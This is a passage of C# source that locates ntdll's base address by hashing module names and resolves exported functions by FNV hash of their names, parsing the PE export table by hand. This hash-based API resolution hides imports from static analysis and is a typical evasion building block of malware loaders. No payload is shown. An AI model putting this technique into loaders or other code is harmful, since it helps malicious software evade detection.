            return IntPtr.Zero;
        }

        private static IntPtr GetNtdllBaseAddress()
        {
            foreach (ProcessModule pModule in Process.GetCurrentProcess().Modules)
            {
                if (FNVHash(pModule.ModuleName) == 0x90CCD0BC)
                    return pModule.BaseAddress;
            }

            return IntPtr.Zero;
        }

        private static IntPtr GetProcAddress(IntPtr lpModuleBase, uint dwFunctionHash)
        {
            IMAGE_DOS_HEADER pIDH;
            IMAGE_NT_HEADERS pINH;

            pIDH = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(lpModuleBase, typeof(IMAGE_DOS_HEADER));

            pINH = (IMAGE_NT_HEADERS)Marshal.PtrToStructure(
               (IntPtr)((uint)lpModuleBase + pIDH.e_lfanew),
                    typeof(IMAGE_NT_HEADERS));

            if (pIDH.e_magic != 0x5A4D)
                return IntPtr.Zero;

            if (pINH.Signature != 0x4550)
                return IntPtr.Zero;

            IMAGE_EXPORT_DIRECTORY pIED = (IMAGE_EXPORT_DIRECTORY)Marshal.PtrToStructure(
                    (IntPtr)((uint)lpModuleBase + pINH.OptionalHeader.ExportTable.VirtualAddress),
                    typeof(IMAGE_EXPORT_DIRECTORY));

            uint addrFunctions = (uint)lpModuleBase + pIED.AddressOfFunctions;
            uint addrNames = (uint)lpModuleBase + pIED.AddressOfNames;
            uint addrNameOrdinals = (uint)lpModuleBase + pIED.AddressOfNameOrdinals;

            for (uint i = 0; i < pIED.NumberOfNames; i++)
            {
                string pszFunctionName = string.Empty;
                pszFunctionName = Marshal.PtrToStringAnsi((IntPtr)(
                    (uint)lpModuleBase +
                    (uint)Marshal.ReadInt32((IntPtr)(addrNames + (i * 4)))));

                if (FNVHash(pszFunctionName) == dwFunctionHash)
                {
                    IntPtr lpFunctionRet = IntPtr.Zero;
                    lpFunctionRet = (IntPtr)(
                        (uint)lpModuleBase +
                        (uint)Marshal.ReadInt32((IntPtr)((uint)lpModuleBase + pIED.AddressOfFunctions +
                        (4 * Marshal.ReadInt16((IntPtr)((uint)lpModuleBase + pIED.AddressOfNameOrdinals + (i * 2)))))));

                    return lpFunctionRet;
                }
            }

            return IntPtr.Zero;
        }
    }
}
